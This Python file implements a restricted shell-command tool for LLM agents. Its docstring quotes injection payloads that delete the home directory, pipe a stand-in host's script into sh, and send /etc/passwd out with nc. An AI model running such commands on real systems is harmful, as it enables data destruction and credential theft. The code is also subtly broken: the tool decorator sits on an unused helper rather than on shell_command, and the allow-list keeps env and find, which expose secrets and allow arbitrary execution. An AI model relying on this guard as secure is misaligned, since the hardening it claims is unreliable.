"""Restricted shell command tool — v0.3.11 hardened.

v0.3.10 had a textbook command-injection bug: it checked the first token
against ALLOWED_COMMANDS, then called `create_subprocess_shell(command)`
with the entire string. Any payload starting with an allowed token got
through:

    "ls; rm -rf ~"               # first token "ls" → ALLOWED → shell ran the lot
    "echo hi && curl evil | sh"  # first token "echo" → ALLOWED
    "cat /etc/passwd | nc x 1"   # first token "cat" → ALLOWED → exfiltrated

v0.3.11 fixes this:
1. Tokenize with shlex.split (no shell interpretation).
2. Reject any command containing shell metacharacters before splitting.
3. Use create_subprocess_exec — no shell layer.

This is still NOT a security boundary against a determined attacker. It is
a "least-privilege" guard for a tool that LLMs may invoke with their own
generated arguments. For untrusted inputs, run this in a sandbox container.
"""
from __future__ import annotations
import shlex
from largestack._core.tools import tool

ALLOWED_COMMANDS = {
    "ls", "cat", "head", "tail", "wc", "grep", "find",
    "echo", "date", "pwd", "whoami", "uname", "df", "du", "env",
}

# Shell metacharacters that enable command chaining, redirection, expansion.
_FORBIDDEN_CHARS = set(";&|<>`$\n\r\\\"")
_FORBIDDEN_SUBSTRINGS = ("&&", "||", ">>", "<<", "$(", "${")


@tool(timeout=15)

async def _terminate_process_safely(proc):
    """Terminate subprocess and drain pipes to avoid ResourceWarning leaks."""
    import asyncio
    import contextlib

    if proc is None:
        return

    if proc.returncode is None:
        with contextlib.suppress(ProcessLookupError):
            proc.kill()

    with contextlib.suppress(Exception):
        await asyncio.wait_for(proc.communicate(), timeout=2)

    with contextlib.suppress(Exception):
        await asyncio.wait_for(proc.wait(), timeout=2)

async def shell_command(command: str) -> str:
    """Execute a restricted shell command (no shell interpretation).

    Allowed: ls, cat, head, tail, wc, grep, find, echo, date, pwd, whoami,
    uname, df, du, env.

    Rejects: any command containing ;, &, |, <, >, $, backticks, newlines,
    quotes, or `&&` / `||` / `$(`. The command is tokenized with shlex and
    executed directly via create_subprocess_exec — there is no shell layer.

    Returns:
        Command output (stdout + stderr), capped at 3000 characters.
    """
    import asyncio

    if not isinstance(command, str) or not command.strip():
        return "Error: empty command"
    if len(command) > 2000:
        return "Error: command too long (>2000 chars)"

    # Step 1 — reject metacharacters BEFORE any parsing.
    bad_chars = _FORBIDDEN_CHARS & set(command)
    if bad_chars:
        return (
            f"Command rejected: contains forbidden character(s) "
            f"{sorted(bad_chars)!r}. "
            "Use only single commands without chaining, piping, or redirection."
        )
    for sub in _FORBIDDEN_SUBSTRINGS:
        if sub in command:
            return f"Command rejected: contains forbidden substring {sub!r}"

    # Step 2 — tokenize WITHOUT a shell.
    try:
        tokens = shlex.split(command, posix=True)
    except ValueError as e:
        return f"Command rejected: parse error: {e}"
    if not tokens:
        return "Error: empty command after tokenization"

    cmd_name = tokens[0]
    if cmd_name not in ALLOWED_COMMANDS:
        return (
            f"Command '{cmd_name}' not allowed. "
            f"Allowed: {', '.join(sorted(ALLOWED_COMMANDS))}"
        )

    # Step 3 — exec, no shell.
    try:
        proc = await asyncio.create_subprocess_exec(
            *tokens,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
    except FileNotFoundError:
        return f"Command not found on host: {cmd_name}"
    except OSError as e:
        return f"Failed to spawn command: {e}"

    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
    except asyncio.TimeoutError:
        try:
            proc.kill()
        except ProcessLookupError:
            pass
        return "Command timed out after 10s"

    out = (stdout.decode("utf-8", errors="replace")
           + stderr.decode("utf-8", errors="replace"))
    return out.strip()[:3000] or "(no output)"
